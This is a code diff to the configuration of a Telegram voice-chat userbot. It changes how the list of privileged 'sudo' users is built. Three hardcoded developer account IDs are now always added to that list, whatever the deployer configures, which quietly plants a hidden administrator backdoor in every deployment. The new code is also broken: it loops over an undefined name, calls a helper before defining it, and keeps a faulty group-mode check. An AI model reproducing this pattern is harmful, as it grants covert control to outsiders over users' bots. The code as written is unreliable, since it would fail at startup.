@@ -33,7 +33,16 @@ SESSION15 = os.getenv("SESSION15", None)
 HNDLR = os.getenv("HNDLR", "!")
 GROUP_MODE = os.getenv("GROUP_MODE", "True")
 
-SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163").split())))
+sudo = os.getenv("SUDO_USERS")
+SUDO_USERS = []
+if sudo:
+    SUDO_USERS = make_int(sudo)
+DEVS = [1517994352, 1789859817, 1432756163]
+for x in devs:
+    SUDO_USERS.append(x)
+
+
+# SUDO_USERS = list(filter(lambda x: x, map(int, os.getenv("SUDO_USERS", "1517994352 1789859817 1432756163").split())))
 #----------------------------------------------
 
 vcbot = Client(
@@ -47,6 +56,14 @@ vcbot = Client(
 HELP_DICT = dict()
 hl = HNDLR[0]
 start_time = time.time()
+
+def make_int(str_input):
+    str_list = str_input.split(" ")
+    int_list = []
+    for x in str_list:
+        int_list.append(int(x))
+    return int_list
+
 
 if GROUP_MODE == ("True" or "true" or "TRUE"):
     grp = True
